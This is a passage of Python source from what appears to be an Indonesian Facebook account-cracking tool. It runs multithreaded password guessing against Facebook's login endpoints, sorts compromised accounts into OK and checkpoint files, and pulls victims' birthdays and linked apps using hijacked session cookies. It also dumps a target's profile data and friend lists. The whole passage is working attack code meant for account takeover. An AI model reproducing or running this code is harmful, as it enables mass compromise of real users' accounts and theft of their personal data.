        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' ► 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' ► 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' ► 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' ► 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' ► 2010'
        elif fx[:6] in ['100001']          :tahunz = ' ► 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' ► 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' ► 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' ► 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' ► 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' ► 2015'
        elif fx[:5] in ['10001']           :tahunz = ' ► 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' ► 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' ► 2018'
        elif fx[:5] in ['10004']           :tahunz = ' ► 2019'
        elif fx[:5] in ['10005']           :tahunz = ' ► 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' ► 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' ► 2008/2009'
    elif len(fx)==8:
        tahunz = ' ► 2007/2008'
    elif len(fx)==7:
        tahunz = ' ► 2006/2007'
    else:tahunz=''
    return tahunz
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('%s►%s►%s► %sCrack With Password Default/Manual [d/m]'%(B,H,M,O))
        while True:
            f = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
            if f=="":
                jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                menu()
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s►%s►%s► %sFor example : lia,786786,123456'%(B,H,M,O))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    start_methodezz()
                    kopi = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                    if kopi in ['']:
                        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
                            except:continue
                    elif kopi in ['2','02']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                            except:continue
                    elif kopi in ['3','03']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
                            except:continue
                    elif kopi in ['4','04']:
                        os.system('rm -rf pass.txt')
                        os.system('rm -rf passangka.txt')
                        tambah_pass()
                        tambah_pass_angka()
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                            except:continue
                    else:
                        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                        menu()
                    start_method()
                    put = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                    if put in ['']:
                        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                        menu()
                    elif put in ['1','01','001','a']:
                        print('%s►%s►%s► %sMemakai  CP Option? [y/t]'%(B,H,M,O))
                        puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                        if puf in ['']:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.api,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                    elif put in ['2','02','002','b']:
                        print('%s►%s►%s► %sMemakai CP Option? [y/t]'%(B,H,M,O))
                        puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                        if puf in ['']:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                    elif put in ['3','03','003','c']:
                        print('%s►%s►%s► %sBring up CP Option? [y/t]'%(B,H,M,O))
                        puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                        if puf in ['']:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.free_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.free,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                            menu()
                    else:
                        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                        menu()
                except Exception as e:
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input('%s►%s►%s► %sEnter Password : '%(B,H,M,O)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
            if put in ['']:
                jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                menu()
            elif put in ['1','01','001','a']:
                print('%s►%s►%s► %sMemakai  CP Option? [y/t]'%(B,H,M,O))
                puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                if puf in ['']:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
            elif put in ['2','02','002','b']:
                print('%s►%s►%s► %sMemakai CP option? [y/t]'%(B,H,M,O))
                puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                if puf in ['']:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
            elif put in ['3','03','003','c']:
                print('%s►%s►%s► %sBring up CP option? [y/t]'%(B,H,M,O))
                puf = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
                if puf in ['']:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.free_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.free,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                    menu()
            else:
                jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
                menu()
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(B,K,B,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%Lia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sLia%s] %s ► %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,H,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(B,K,B,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sLia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sLia%s] %s ► %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,P,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sLia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sLia%s] %s ► %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,H,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(B,K,B,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sLia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sLia%s] %s ► %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,H,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(B,K,B,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sLia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sLia%s] %s ► %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,H,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sLia%s] %s ► %s ► %s %s %s%s"%(B,K,B,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s►%s►%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s►%s►%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sLia%s] %s ► %s%s     "%(B,K,B,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s►%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sLia%s] %s ► %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s►%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s►%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sLia%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(B,H,B,H,self.ko,len(self.fl),B,H,len(self.ada),B,K,len(self.cp),B,K), end=' ');sys.stdout.flush()
        except:
            self.free_opsi(fl)
def target():
    try:token = open('token.txt','r').read()
    except (KeyError,IOError):jalan('%s►%s►%s► %sToken/Cookies Invalid'%(B,H,M,O));menu_log()
    idt = input("%s►%s►%s► %sID Target : "%(B,H,M,O))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s►%s►%s► %sID Tidak Ditemukan'%(B,H,M,O));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s►%s►%s► %sNama : '%(B,H,M,O,nm))
    jalan('%s►%s►%s► %sNama Depan : '%(B,H,M,O,nd))
    jalan('%s►%s►%s► %sNama Tengah : '%(B,H,M,O,nt))
    jalan('%s►%s►%s► %sNama Belakang : '%(B,H,M,O,nb))
    jalan('%s►%s►%s► %sTTL : '%(B,H,M,O,ut))
    jalan('%s►%s►%s► %sGender : '%(B,H,M,O,gd))
    jalan('%s►%s►%s► %sEmail : '%(B,H,M,O,em))
    jalan('%s►%s►%s► %sLink : '%(B,H,M,O,lk))
    jalan('%s►%s►%s► %sUsername : '%(B,H,M,O,us))
    jalan('%s►%s►%s► %sAgama : '%(B,H,M,O,rg))
    jalan('%s►%s►%s► %sStatus Hubungan : '%(B,H,M,O,rl))
    jalan('%s►%s►%s► %sHubungan Dengan : '%(B,H,M,O,rls))
    jalan('%s►%s►%s► %sTempat Tinggal : '%(B,H,M,O,lc))
    jalan('%s►%s►%s► %sTempat Asal : '%(B,H,M,O,ht))
    jalan('%s►%s►%s► %sTentang : '%(B,H,M,O,ab))
    jalan('%s►%s►%s► %sLocale : '%(B,H,M,O,lo))
    input('%s►%s►%s► %sReturn '%(B,H,M,O))
    menu()
def teman_target():
    it = input('%s►%s►%s► %sID Target : '%(B,H,M,O))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s►%s►%s► %sName : %s'%(B,H,M,O,nn['name']))
    except (KeyError,IOError):
        jalan('%s►%s►%s► %sToken/Cookies Invalid'%(B,H,M,O))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s►%s►%s► %sLimit Dump : '%(B,H,M,O))
    print('%s►'%(H))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('%s►%s[!] %sPrivate'%(H,M,O))
            print('►►',id,'•',len(te))
            te.clear()
        except KeyError:
            print('%s►%s[!] %sSpam Accounts'%(H,M,O))
    print('%s►'%(H))
    input('%s►%s►%s►%s Return'%(B,H,M,O))
    menu()
def hasil():
    clear()
    banner()
    jalan('%s►%s►%s► %sCrack Results'%(B,H,M,O))
    print('%s►%s►%s► 1.%sCheck Result OK'%(B,H,M,O))
    print('%s►%s►%s► 2.%sCheck result CP'%(B,H,M,O))
    ch = input('%s►%s►%s► %sChoose : '%(B,H,M,O))
    if ch in ['']:
        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('%s►%s►%s►%s Crack Results Stored in File OK'%(B,H,M,O))
            for file in okl:
                print('%s►%s►%s► %s%s'%(B,H,M,O,file))
            files = input('%s►%s►%s► %sEnter File Name : '%(B,H,M,O))
            print('')
            if files == "":
                jalan('%s►%s►%s► %sCorrect Content'%(B,H,M,O))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('%s►%s►%s► %sTotal Crack Result Date %s  is %s Account'%(B,H,M,O,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s►%s►%s►%s No Results Found '%(B,H,M,O))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s►%s►%s►%s Crack Results Stored in CP Files '%(B,H,M,O))
            for file in cpl:
                print('%s►%s►%s► %s%s'%(B,H,M,O,file))
            files = input('%s►%s►%s► %sEnter File Name : '%(B,H,M,O))
            print('')
            if files == "":
                jalan('%s►%s►%s► %sCorrect Content'%(B,H,M,O))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('%s►%s►%s► %sTotal Crack Result Date %s is %s Account'%(B,H,M,O,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s►%s►%s►%s No Results Found'%(B,H,M,O))
    else:
        jalan('%s►%s►%s►] %sCorrect Content'%(B,H,M,O))
        menu()
    input('%s►%s►%s► %sReturn'%(B,H,M,O))
    menu()
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s► %sSpam Accounts"%(B,M))
    if "c_user" in ses.cookies:
        print("%s► %sAccount OK No Checkpointt"%(B,H))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s► %sOne Tap Account"%(B,H))
        else:
            print("%s► %sThereis %s Option "%(B,H,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
